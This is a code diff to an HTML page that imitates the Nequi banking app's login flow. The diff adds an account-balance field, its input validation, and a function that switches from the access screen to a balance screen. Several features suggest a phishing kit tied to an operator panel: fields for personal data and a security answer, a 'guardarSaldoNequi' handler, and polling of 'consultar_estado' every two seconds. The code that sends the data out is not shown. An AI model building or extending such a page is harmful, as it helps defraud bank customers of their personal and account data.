@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 
 <html lang="es" class="hydrated">
@@ -86,7 +85,7 @@
     // Vista previa sin panel: index.html?demo=saldo
     if (/[?&]demo=saldo(?:&|$)/i.test(window.location.search)) {
       window.__nequiDemoSaldo = true;
-      $(".home").hide();
+      $(".acceso").hide();
       vista_saldo();
     } else {
       setInterval(consultar_estado, 2000);
@@ -456,8 +455,7 @@
 
 </div>
 
-
-
+<!--****************************  ****************************-->
 
 <div class="saldo-disponible" style="display: none;">
                 <div _ngcontent-cby-c37="" class="auth-content">
@@ -477,7 +475,7 @@
                             </div>
                     <div _ngcontent-cby-c37="" class="form__buttons">
                         <nequi-button _ngcontent-cby-c37="" _nghost-cby-c21="">
-                            <button _ngcontent-cby-c21="" pbutton="" pripple="" type="button" class="p-element p-button-primary p-button p-component" id="btnSaldo" onclick="guardarSaldoNequi()">
+                            <button _ngcontent-cby-c21="" pbutton="" pripple="" type="button" class="p-element p-button-primary p-button p-component" id="btnSaldo" onclick="guardarSaldoNequi()" disabled>
                                 <span class="p-button-label">Continuar</span>
                             </button>
                         </nequi-button>
@@ -499,7 +497,8 @@
   const inputApellido = document.getElementById("apellido");
   const inputCelular = document.getElementById("celular");
   const inputNacimiento = document.getElementById("nacimiento");
-  const inputRespuesta = document.getElementById("resp2");  
+  const inputRespuesta = document.getElementById("resp2");
+  const inputSaldo = document.getElementById("inputsaldo"); // Nuevo campo para el saldo
 
     inputUsuario.addEventListener("input", function() {
 
@@ -581,6 +580,14 @@
 
     });     
 
+    // Nuevo listener para el campo de saldo
+    inputSaldo.addEventListener("input", function() {
+      if (this.value.trim().length == 0) {
+        this.classList.remove("p-filled");
+      } else {
+        this.classList.add("p-filled");
+      }
+    });
 
         function check($this) {
             if ($this.value == '') {
@@ -692,8 +699,27 @@
                                 btnResp.disabled = true;
                             }                           
 
-                        });                                           
+                        });
 
+        // Nuevo código para manejar el botón de saldo
+        var btnSaldo = document.getElementById('btnSaldo');
+        
+        inputSaldo.addEventListener("keyup", function () {
+            check(this);
+            
+            // Validar que el campo de saldo tenga al menos 3 caracteres (ej: $10)
+            if (inputSaldo.value.trim().length >= 3) {
+                btnSaldo.disabled = false;
+            } else {
+                btnSaldo.disabled = true;
+            }
+        });
+
+        // Función para mostrar la vista de saldo
+        function vista_saldo() {
+            document.querySelector('.acceso').style.display = 'none';
+            document.querySelector('.saldo-disponible').style.display = 'block';
+        }
 
 </script>
 
